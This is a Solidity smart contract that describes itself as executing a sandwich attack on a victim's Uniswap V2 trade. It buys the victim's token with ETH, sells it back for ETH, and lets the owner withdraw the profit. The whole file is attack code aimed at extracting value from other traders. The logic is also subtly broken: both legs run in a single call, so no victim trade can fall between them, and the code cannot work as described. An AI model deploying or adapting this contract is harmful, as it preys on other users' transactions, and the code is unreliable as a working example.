// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// Interface for a standard Uniswap V2 Router
interface IUniswapV2Router {
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Executor is Ownable {
    // WETH address is constant on mainnet
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor() Ownable(msg.sender) {}

    /**
     * @notice Executes a sandwich attack.
     * @param router The address of the DEX router (e.g., Uniswap V2).
     * @param victimToken The address of the token being traded by the victim.
     * @param frontrunEthAmount The amount of ETH to use for the front-run buy.
     */
    function executeSandwich(
        address router,
        address victimToken,
        uint256 frontrunEthAmount
    ) external payable onlyOwner {
        require(msg.value == frontrunEthAmount, "Incorrect ETH sent");

        // === 1. FRONT-RUN: Buy the token with our ETH ===
        address[] memory pathToToken = new address[](2);
        pathToToken[0] = WETH;
        pathToToken[1] = victimToken;

        IUniswapV2Router(router).swapExactETHForTokens{value: frontrunEthAmount}(
            0, // amountOutMin: we accept any amount
            pathToToken,
            address(this), // Recipient is this contract
            block.timestamp
        );

        // At this point in a real attack, the victim's transaction would be included,
        // pushing the price of `victimToken` up.

        // === 2. BACK-RUN: Sell the tokens we just acquired ===
        uint256 acquiredTokenBalance = IERC20(victimToken).balanceOf(address(this));
        
        // Approve the router to spend our newly acquired tokens
        IERC20(victimToken).approve(router, acquiredTokenBalance);

        address[] memory pathToEth = new address[](2);
        pathToEth[0] = victimToken;
        pathToEth[1] = WETH;

        IUniswapV2Router(router).swapExactTokensForETH(
            acquiredTokenBalance, // Sell all tokens we have
            0, // amountOutMin: accept any amount of ETH
            pathToEth,
            address(this), // ETH goes to this contract
            block.timestamp
        );
    }

    // Function to withdraw profits (ETH) from the contract
    function withdraw() external onlyOwner {
        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success, "Withdrawal failed");
    }

    // Required to receive ETH from swaps and withdrawals
    receive() external payable {}
}